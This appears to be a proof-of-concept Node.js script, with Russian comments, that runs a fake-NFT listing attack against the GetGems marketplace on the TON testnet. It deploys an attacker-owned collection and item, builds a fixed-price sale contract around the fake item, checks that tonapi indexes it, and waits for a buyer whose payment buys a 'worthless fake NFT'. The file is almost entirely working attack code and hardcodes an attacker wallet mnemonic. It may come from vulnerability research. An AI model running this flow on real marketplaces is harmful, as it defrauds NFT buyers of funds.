/**
 * HYP-05 Scenario A FULL:
 *  1. Compile nft-collection.fc + nft-item.fc
 *  2. Deploy real NFT collection (attacker as owner)
 *  3. Mint NFT item #0 through collection
 *  4. Deploy sale contract (nft_address = fake NFT item)
 *  5. Transfer NFT → sale (triggers ownership_assigned → sale initialized)
 *  6. Verify tonapi indexes collection + NFT item
 *  7. Wait for Tonkeeper purchase → is_complete=1
 *
 * Run: node 02-fake-nft-listing/poc-scenario-a-full.js
 */

const path  = require('path');
const fs    = require('fs');
const https = require('https');
const { compileFunc } = require('../nft-contracts/node_modules/@ton-community/func-js');
const { mnemonicToWalletKey } = require('../nft-contracts/node_modules/@ton/crypto');
const {
  WalletContractV4, TonClient, internal, toNano,
  Address, beginCell, contractAddress, Cell
} = require('../nft-contracts/node_modules/@ton/ton');

// ── Config ──────────────────────────────────────────────────────────────────
const ATTACKER_MNEMONIC = 'asthma black design brick oxygen cat that potato nurse umbrella quote snack bag color walnut jump stem cloth kit sand volcano secret cloth better';
const BUYER_ADDR        = Address.parse('0QBCbLvcECimdYRFI5B-4TqTD7o9egF4BaXiVwXHWw6ne0ds');

const FULL_PRICE   = toNano('0.05');
const GETGEMS_MARKETPLACE     = Address.parse('0:59a76b59f5651940ff0080bda050791d2507bef0dc8070592c9f72fb75c67160');
const MARKETPLACE_FEE_ADDRESS = GETGEMS_MARKETPLACE;
const OP_TRANSFER  = 0x5fcc3d14;

const BASE_URL = 'https://raw.githubusercontent.com/mmski2002-eng/DELETEBOT/main/TON/GETGEMS/nft-metadata';
const SOURCES_DIR = path.resolve(__dirname, '../contracts/sources');
const PATCH = 'int builder_null?(builder b) asm "ISNULL";';

const NftFixPriceSaleV4R1CodeBoc = 'te6ccgECGAEABvsAART/APSkE/S88sgLAQIBYgIDAgLNBAUAZ6G859qJoaYB9IH0gfQBpj+mf6noCGADofSB9IGmIaYh9IGmPmAZgAIYFhShMC4grCBqgCcD8ddtF2/ZnoaYGAuNhJL4HwfSAYdqJoaYB9IH0gfQBpj+mf6noCOCmGY4BgAEqYhmmPhu8Q4YBKGAZpn8cJRbMbC3MbK2QXY4LJmLmA7ygG8RRrpOEBF0CBFd0WYACRWdjYKe3jgthxgUEIObFoTil4XXGBFeAA+WjKQGBwgAr/aH0gfSBpiGmIfSBpj5gYKbLeSsCIyvl4bykxwQDDUFTCKTFBAMNQVMIpsNCQ0JBggBHggFiRYIBYyflg4e8Sa6Tggck4GW8S66Tggck4Ge8oM9CoAqGJwAZhZfBmxy1DDQ0wchgCCw8tGVIsMAjhSBAlj4I1NBobwE+CMCoLkTsPLRlpEy4gHUMAH7AASYMzU1Oyj6RAHAAPLhxAP6APpAMFFCgwf0Dm+hsxqxDLMcseMCB/oAMFOguYIQD39JABu5GrHjAlR3KSTtRO1F7UeK7WftZe1kdH/tEQkKCwwD/oIQZkwJBVLwupJfD+CCEPtdv0dS8LpT28cFsI5IMDEyNzg4OAPTAAHAAJPywV7e0/8wBYMI1xgg+QFAB/kQ8qME+kD0BDAQR0VgECQHyMsAUAbPFlAEzxZY+gLLH8s/zPQAye1U4DOCEP0TX3tS4LpTyccFsOMCArPjAjEzMzYREhMAzFtQdV8FVBAxfyLBAZJfBo5UcCHA/5NbcH/ecCCCEA+KfqXIyx8Yyz9QBfoCUAXPFljPFhTKACP6AssAyXGAEMjLBVAFzxYikjNwmIIKYloAUASg4hP6AhPLaszJAZKAQpFz4vsA4gDMMFB1XwVUEDF/IsEBkl8GjlRwIcD/k1twf95wIIIQD4p+pcjLHxjLP1AF+gJQBc8WWM8WFMoAI/oCywDJcYAQyMsFUAXPFiKSM3CYggpiWgBQBKDiE/oCE8tqzMkBkoBCkXPi+wDiAMRbZn8iwQGSXwaOVHAhwP+TW3B/3nAgghAPin6lyMsfGMs/UAX6AlAFzxZYzxYUygAj+gLLAMlxgBDIywVQBc8WIpIzcJiCCmJaAFAEoOIT+gITy2rMyQGSgEKRc+L7AOLbMQEQiu1B7fEB8v8NAexUGJnwB3EtVEkwVEygVhFQCyLBAZJfBo5UcCHA/5NbcH/ecCCCEA+KfqXIyx8Yyz9QBfoCUAXPFljPFhTKACP6AssAyXGAEMjLBVAFzxYikjNwmIIKYloAUASg4hP6AhPLaszJAZKAQpFz4vsA4nEsUThGc1L3DgHKIsEBkl8GjlRwIcD/k1twf95wIIIQD4p+pcjLHxjLP1AF+gJQBc8WWM8WFMoAI/oCywDJcYAQyMsFUAXPFiKSM3CYggpiWgBQBKDiE/oCE8tqzMkBkoBCkXPi+wDicSpRNkUzUtYPAcoiwQGSXwaOVHAhwP+TW3B/3nAgghAPin6lyMsfGMs/UAX6AlAFzxZYzxYUygAj+gLLAMlxgBDIywVQBc8WIpIzcJiCCmJaAFAEoOIT+gITy2rMyQGSgEKRc+L7AOIXfyNUSjBSsBAC1CLBAZJfBo5UcCHA/5NbcH/ecCCCEA+KfqXIyx8Yyz9QBfoCUAXPFljPFhTKACP6AssAyXGAEMjLBVAFzxYikjNwmIIKYloAUASg4hP6AhPLaszJAZKAQpFz4vsA4lQlB9s8cUVGE/gjQxMWFwBYN18DNzc3+gD0BDAQRxA2RUBDMAfIywBQBs8WUATPFlj6Assfyz/M9ADJ7VQAmDA2OSDQ+kD6QNMQ0xD6QNMfMBVfBRjHBfLh9IIQBRONkRm68uH1AvpAMBBHEDZQVUQUAwfIywBQBs8WUATPFlj6Assfyz/M9ADJ7VQD/HNSkLqO6TiCEAX14QAXvvLhyVNBxwVTU8cFsfLhyiPQ+kD6QNMQ0xD6QNMfMBVfBXAgghBfzD0UIYAQyMsFUAXPFljAChTLahPLHxnLPyPPFlAGzxYVygAm+gIWygDJgwb7AHFwVBYAEDZAFVBEA+AowAByGroZseMCXwiEDxcUFQL6IcEB8tHLghAF9eEAUiCgUnC+8uHCVFF18AcxUnYgwQGRW44TcIAQyMsFUAPPFgH6AstqyXP7AOJQIyDBAZFbjhNwgBDIywVQA88WAfoCy2rJc/sA4iDBAZFbjhNwgBDIywVQA88WAfoCy2rJc/sA4lQgdts8cUVGE/gjUCMWFwAE8vAAaHAgghBfzD0UyMsfFMs/Is8WWM8WEsoAcfoCygDJcYAYyMsFUAPPFnD6AhLLaszJgQCC+wAAMgfIywBQBs8WUATPFlj6Assfyz/M9ADJ7VQ=';
const SALE_CODE_CELL = Cell.fromBase64(NftFixPriceSaleV4R1CodeBoc);

const client = new TonClient({
  endpoint: 'https://testnet.toncenter.com/api/v2/jsonRPC',
  apiKey: '',
});

// ── Helpers ─────────────────────────────────────────────────────────────────
function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
function fmt(n)    { return (Number(n) / 1e9).toFixed(6); }

async function withRetry(fn, max = 6) {
  for (let i = 1; i <= max; i++) {
    try { return await fn(); } catch (e) {
      if (i < max) { await sleep(e.message?.includes('429') ? 2500 * i : 1200); continue; }
      throw e;
    }
  }
}

function httpsGet(url) {
  return new Promise((res, rej) => {
    https.get(url, { headers: { Accept: 'application/json' } }, r => {
      let d = '';
      r.on('data', c => d += c);
      r.on('end', () => {
        try { res({ status: r.statusCode, body: JSON.parse(d) }); }
        catch { res({ status: r.statusCode, body: { raw: d.substring(0, 300) } }); }
      });
    }).on('error', rej);
  });
}

function makeOffchainContent(url) {
  return beginCell()
    .storeUint(0x01, 8)
    .storeBuffer(Buffer.from(url))
    .endCell();
}

async function compile(targets) {
  const r = await compileFunc({
    targets,
    sources: p => p === 'patch.fc' ? PATCH : fs.readFileSync(path.join(SOURCES_DIR, p), 'utf8'),
  });
  if (r.status === 'error') throw new Error('FunC: ' + r.message);
  return Cell.fromBase64(r.codeBoc);
}

// ── Sale data cell ───────────────────────────────────────────────────────────
function buildSaleDataCell(opts) {
  const feeInt = Math.floor(opts.feePercent * 100_000);
  return beginCell()
    .storeBit(0)
    .storeAddress(opts.marketplaceAddress)
    .storeAddress(null)
    .storeCoins(opts.fullPrice)
    .storeUint(0, 32)
    .storeUint(0, 64)
    .storeRef(beginCell()
      .storeAddress(opts.marketplaceFeeAddress)
      .storeAddress(opts.royaltyAddress)
      .storeUint(feeInt, 17)
      .storeUint(0, 17)
      .storeAddress(opts.nftAddress)
      .storeUint(opts.timestamp, 32)
      .endCell())
    .storeDict(null)
    .storeBit(0)
    .endCell();
}

async function getSaleState(saleAddr) {
  try {
    const r = await withRetry(() => client.runMethod(saleAddr, 'get_fix_price_data_v4'));
    const isCompleteTVM = r.stack.readNumber();
    r.stack.readNumber();
    r.stack.readCell();
    r.stack.readCell();
    const ownerCell = r.stack.readCell();
    const owner = ownerCell.beginParse().loadAddress();
    return {
      isComplete: isCompleteTVM !== 0,
      owner: owner?.toString({ testOnly: true, bounceable: true }) ?? 'addr_none',
    };
  } catch (e) { return { error: e.message }; }
}

// ── Main ─────────────────────────────────────────────────────────────────────
async function main() {
  console.log('╔══════════════════════════════════════════════════════════════╗');
  console.log('║  HYP-05 Scenario A FULL: Real Collection + Fake NFT Sale    ║');
  console.log('╚══════════════════════════════════════════════════════════════╝\n');

  // ── Кошельки ──
  const atkKey    = await mnemonicToWalletKey(ATTACKER_MNEMONIC.split(/\s+/));
  const atkWallet = WalletContractV4.create({ publicKey: atkKey.publicKey, workchain: 0 });
  const atkAddr   = atkWallet.address;
  const atk       = client.open(atkWallet);

  console.log('[Атакующий]', atkAddr.toString({ testOnly: true, bounceable: true }));
  const atkBal0 = await withRetry(() => client.getContractState(atkAddr));
  console.log('  баланс:', fmt(BigInt(atkBal0.balance || '0')), 'TON');
  const atkBalBefore = BigInt(atkBal0.balance || '0');

  console.log('[Покупатель]', BUYER_ADDR.toString({ testOnly: true, bounceable: false }));
  const buyerBal0 = await withRetry(() => client.getContractState(BUYER_ADDR));
  console.log('  баланс:', fmt(BigInt(buyerBal0.balance || '0')), 'TON\n');
  const buyerBalBefore = BigInt(buyerBal0.balance || '0');

  // ── 1. Компиляция ──────────────────────────────────────────────────────
  console.log('[1] Компиляция контрактов...');
  const [COL_CODE, NFT_CODE] = await Promise.all([
    compile(['imports/stdlib.fc', 'op-codes.fc', 'params.fc', 'patch.fc', 'nft-collection.fc']),
    compile(['imports/stdlib.fc', 'op-codes.fc', 'params.fc', 'patch.fc', 'nft-item.fc']),
  ]);
  console.log('  collection: OK | nft-item: OK\n');

  // ── 2. Deploy collection ───────────────────────────────────────────────
  console.log('[2] Deploy NFT collection');
  const nonce = Math.floor(Date.now() / 1000);
  const collContent = makeOffchainContent(`${BASE_URL}/collection.json#${nonce}`);
  const collData = beginCell()
    .storeRef(collContent)
    .storeUint(0, 64)          // next_item_index = 0
    .storeAddress(atkAddr)     // owner = attacker
    .storeRef(NFT_CODE)        // nft_item_code
    .endCell();

  const collAddr = contractAddress(0, { code: COL_CODE, data: collData });
  const collTestnet = collAddr.toString({ bounceable: true, testOnly: true });
  console.log('  collection:', collTestnet);

  const collExist = await withRetry(() => client.getContractState(collAddr));
  if (collExist.state === 'active') {
    console.log('  [!] Уже задеплоена.');
  } else {
    const seq = await withRetry(() => atk.getSeqno());
    await withRetry(() => atk.sendTransfer({
      seqno: seq,
      secretKey: atkKey.secretKey,
      messages: [internal({ to: collAddr, value: toNano('0.05'), bounce: false, init: { code: COL_CODE, data: collData } })],
    }));
    console.log('  TX отправлена, ждём 15s...');
    await sleep(15000);
    const st = await withRetry(() => client.getContractState(collAddr));
    console.log('  state:', st.state, '| balance:', fmt(BigInt(st.balance || '0')), 'TON');
  }

  // ── 3. Mint NFT item #0 through collection ────────────────────────────
  console.log('\n[3] Mint NFT item #0 через коллекцию');

  // Pre-calculate NFT address (same formula as collection contract)
  const nftItemData = beginCell()
    .storeUint(0, 64)
    .storeAddress(collAddr)
    .endCell();
  const nftAddr = contractAddress(0, { code: NFT_CODE, data: nftItemData });
  const nftTestnet = nftAddr.toString({ bounceable: true, testOnly: true });
  console.log('  NFT адрес:', nftTestnet);

  const nftExist = await withRetry(() => client.getContractState(nftAddr));
  if (nftExist.state === 'active') {
    console.log('  [!] Уже задеплоен.');
  } else {
    const itemContent = makeOffchainContent(`${BASE_URL}/0.json`);
    // op=1: deploy nft (item_index + nft_content_ref + nft_owner + amount)
    const mintBody = beginCell()
      .storeUint(1, 32)              // op = deploy nft
      .storeUint(0, 64)              // query_id
      .storeUint(0, 64)              // item_index = 0
      .storeRef(itemContent)         // nft_content
      .storeAddress(atkAddr)         // nft_owner = attacker
      .storeCoins(toNano('0.05'))    // deploy amount for nft item
      .endCell();

    await sleep(500);
    const seq2 = await withRetry(() => atk.getSeqno());
    await withRetry(() => atk.sendTransfer({
      seqno: seq2,
      secretKey: atkKey.secretKey,
      messages: [internal({ to: collAddr, value: toNano('0.15'), bounce: true, body: mintBody })],
    }));
    console.log('  TX отправлена, ждём 20s...');
    await sleep(20000);

    const st = await withRetry(() => client.getContractState(nftAddr));
    console.log('  NFT state:', st.state, '| balance:', fmt(BigInt(st.balance || '0')), 'TON');
    if (st.state !== 'active') {
      console.log('  ⚠️  NFT не задеплоен!');
      process.exit(1);
    }
  }

  // ── 4. Deploy sale contract ───────────────────────────────────────────
  console.log('\n[4] Deploy sale contract (nft_address = fake NFT item)');

  const timestamp = Math.floor(Date.now() / 1000);
  const saleData = buildSaleDataCell({
    marketplaceAddress:    GETGEMS_MARKETPLACE,
    nftAddress:            nftAddr,
    fullPrice:             FULL_PRICE,
    feePercent:            0.025,
    marketplaceFeeAddress: MARKETPLACE_FEE_ADDRESS,
    royaltyAddress:        atkAddr,
    timestamp,
  });
  const saleAddr = contractAddress(0, { code: SALE_CODE_CELL, data: saleData });
  const saleTestnet = saleAddr.toString({ bounceable: true, testOnly: true });
  console.log('  sale:', saleTestnet);

  const saleExist = await withRetry(() => client.getContractState(saleAddr));
  if (saleExist.state === 'active') {
    console.log('  [!] Уже задеплоен.');
  } else {
    await sleep(500);
    const seq3 = await withRetry(() => atk.getSeqno());
    await withRetry(() => atk.sendTransfer({
      seqno: seq3,
      secretKey: atkKey.secretKey,
      messages: [internal({ to: saleAddr, value: toNano('0.05'), bounce: false, init: { code: SALE_CODE_CELL, data: saleData } })],
    }));
    console.log('  TX отправлена, ждём 15s...');
    await sleep(15000);
    const st = await withRetry(() => client.getContractState(saleAddr));
    console.log('  state:', st.state, '| balance:', fmt(BigInt(st.balance || '0')), 'TON');
  }

  // ── 5. Transfer NFT → sale (triggers ownership_assigned) ─────────────
  console.log('\n[5] Transfer NFT → sale contract');

  const saleStateCheck = await getSaleState(saleAddr);
  if (!saleStateCheck.error && saleStateCheck.owner !== 'addr_none') {
    console.log('  [!] Sale уже инициализирован. nft_owner:', saleStateCheck.owner);
  } else {
    const transferBody = beginCell()
      .storeUint(OP_TRANSFER, 32)
      .storeUint(0, 64)
      .storeAddress(saleAddr)      // new_owner = sale contract
      .storeAddress(atkAddr)       // response_dest = attacker
      .storeBit(0)                 // no custom_payload
      .storeCoins(toNano('0.1'))   // forward_amount → triggers ownership_assigned
      .storeBit(0)                 // empty forward_payload
      .endCell();

    await sleep(500);
    const seq4 = await withRetry(() => atk.getSeqno());
    await withRetry(() => atk.sendTransfer({
      seqno: seq4,
      secretKey: atkKey.secretKey,
      messages: [internal({ to: nftAddr, value: toNano('0.3'), bounce: true, body: transferBody })],
    }));
    console.log('  TX отправлена, ждём 25s...');
    await sleep(25000);

    const saleState2 = await getSaleState(saleAddr);
    const isInit = !saleState2.error && saleState2.owner !== 'addr_none';
    console.log('  Sale is_initialized:', isInit ? '✅ TRUE' : '❌ FALSE');
    if (isInit) console.log('  nft_owner:', saleState2.owner);
    if (!isInit) { console.log('  ⚠️  Не инициализировался. Стоп.'); process.exit(1); }
  }

  // ── 6. Tonapi indexing check ──────────────────────────────────────────
  console.log('\n[6] Проверяем tonapi');
  await sleep(3000);

  const [nftResp, colResp] = await Promise.all([
    httpsGet(`https://testnet.tonapi.io/v2/nfts/${encodeURIComponent(nftAddr.toRawString())}`),
    httpsGet(`https://testnet.tonapi.io/v2/nfts/collections/${encodeURIComponent(collAddr.toRawString())}`),
  ]);

  console.log('  NFT:        HTTP', nftResp.status, nftResp.status === 200
    ? '✅ ИНДЕКСИРОВАН — name: ' + (nftResp.body.metadata?.name ?? '(no name)')
    : '❌ ' + JSON.stringify(nftResp.body).substring(0, 100));

  console.log('  Collection: HTTP', colResp.status, colResp.status === 200
    ? '✅ ИНДЕКСИРОВАНА — name: ' + (colResp.body.metadata?.name ?? '(no name)')
    : '❌ ' + JSON.stringify(colResp.body).substring(0, 100));

  if (nftResp.status === 200) {
    const nftData = nftResp.body;
    if (nftData.sale) {
      console.log('\n  ✅ SALE ОБНАРУЖЕНА tonapi:');
      console.log('     sale.address:        ', nftData.sale.address);
      console.log('     sale.market.address: ', nftData.sale.market?.address);
      console.log('     sale.price.value:    ', nftData.sale.price?.value);
    } else {
      console.log('\n  ⚠️  tonapi: sale = null (индексация ещё не прошла или code hash не распознан)');
      console.log('     interfaces:', JSON.stringify(nftData.interfaces));
    }
  }
  // Also check sale contract interfaces directly
  const saleAccResp = await httpsGet(`https://testnet.tonapi.io/v2/accounts/${saleAddr.toRawString()}`);
  if (saleAccResp.status === 200) {
    console.log('\n  Sale contract interfaces:', JSON.stringify(saleAccResp.body.interfaces));
    console.log('  Sale contract methods:   ', JSON.stringify(saleAccResp.body.get_methods));
  }

  // ── 7. Ждём покупку ───────────────────────────────────────────────────
  console.log('\n╔══════════════════════════════════════════════════════════════╗');
  console.log('║  АТАКА ГОТОВА — жди GetGems индексацию (~2-5 мин)           ║');
  console.log('╠══════════════════════════════════════════════════════════════╣');
  console.log('║                                                              ║');
  console.log('║  NFT:  testnet.getgems.io/nft/' + nftAddr.toRawString().substring(0,28) + '║');
  console.log('║                                                              ║');
  console.log('║  Tonkeeper Testnet → отправь 0.08 TON на:                  ║');
  console.log('║  ' + saleTestnet.padEnd(56) + '║');
  console.log('║                                                              ║');
  console.log('╚══════════════════════════════════════════════════════════════╝');
  console.log('\n  Collection: https://testnet.tonscan.org/address/' + collAddr.toRawString());
  console.log('  NFT:        https://testnet.tonscan.org/address/' + nftAddr.toRawString());
  console.log('  Sale:       https://testnet.tonscan.org/address/' + saleAddr.toRawString());
  console.log('\n  Жду покупку...\n');

  for (let i = 0; i < 80; i++) {
    await sleep(15000);
    const state = await getSaleState(saleAddr);
    if (state.isComplete) {
      const [atkBal1, buyerBal1] = await Promise.all([
        withRetry(() => client.getContractState(atkAddr)),
        withRetry(() => client.getContractState(BUYER_ADDR)),
      ]);
      const atkDelta   = BigInt(atkBal1.balance   || '0') - atkBalBefore;
      const buyerDelta = BigInt(buyerBal1.balance || '0') - buyerBalBefore;

      console.log('\n╔══════════════════════════════════════════════════════════════╗');
      console.log('║  ✅ HYP-05 SCENARIO A FULLY CONFIRMED                       ║');
      console.log('╠══════════════════════════════════════════════════════════════╣');
      console.log('║  Real TEP-62 NFT collection deployed                         ║');
      console.log('║  NFT item minted — indexed by tonapi/GetGems                 ║');
      console.log('║  Sale accepted fake NFT without on-chain TEP-62 validation   ║');
      console.log('║  Buyer paid real TON, received worthless fake NFT            ║');
      console.log('║                                                              ║');
      console.log('║  Атакующий: Δ=' + fmt(atkDelta).padEnd(49) + '║');
      console.log('║  Покупатель: Δ=' + fmt(buyerDelta).padEnd(48) + '║');
      console.log('╚══════════════════════════════════════════════════════════════╝');
      console.log('\n  https://testnet.tonscan.org/address/' + saleAddr.toRawString());
      process.exit(0);
    }
    process.stdout.write('  ' + new Date().toLocaleTimeString() + ' ждём...\r');
  }

  console.log('\n[!] Таймаут. Sale: https://testnet.tonscan.org/address/' + saleAddr.toRawString());
}

main().catch(e => { console.error('FATAL:', e.message); process.exit(1); });
